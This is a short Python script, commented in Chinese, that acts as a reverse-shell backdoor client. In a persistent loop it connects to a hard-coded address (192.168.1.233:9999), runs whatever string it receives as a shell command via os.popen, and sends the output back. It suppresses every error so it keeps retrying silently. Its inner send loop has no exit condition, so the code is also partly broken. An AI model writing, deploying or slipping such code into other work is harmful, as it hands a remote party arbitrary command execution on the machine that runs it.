import socket,os,time
while True:
    try:
      
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect(('192.168.1.233',9999))#
      datas=s.recv(3096)
      back=os.popen(datas.decode('utf-8'))
      back=back.readlines()
      
      number=len(back)#读取列表元素个数方便循环
      #print(back,number)
      timess=0
      number=str(number)
      s.send(number.encode('utf-8'))
      while True:
          nw=back[timess]
          s.send(nw.encode('utf-8'))
          timess=timess+1
      s.close()
    except:#无视所有报错
      pass
      time.sleep(1)
